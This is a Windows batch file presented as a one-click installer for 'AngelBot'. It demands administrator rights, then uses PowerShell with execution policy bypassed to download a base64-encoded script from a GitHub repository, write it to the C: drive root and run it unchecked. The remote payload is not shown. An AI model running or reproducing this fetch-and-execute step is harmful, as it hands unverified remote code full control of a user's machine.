@echo off
:: AngelBot One-Click Installer
:: Right-click this file and choose "Run as administrator"

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Please right-click this file and choose "Run as administrator"
    pause
    exit /b 1
)

echo Downloading and launching AngelBot Installer...

powershell -ExecutionPolicy Bypass -Command "$r = Invoke-WebRequest -Uri 'https://api.github.com/repos/HackMe7822/AngelBot/contents/install.ps1' -UseBasicParsing | ConvertFrom-Json; [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($r.content -replace '\s',''))) | Out-File 'C:\ab_install.ps1' -Encoding ASCII; & 'C:\ab_install.ps1'"

pause
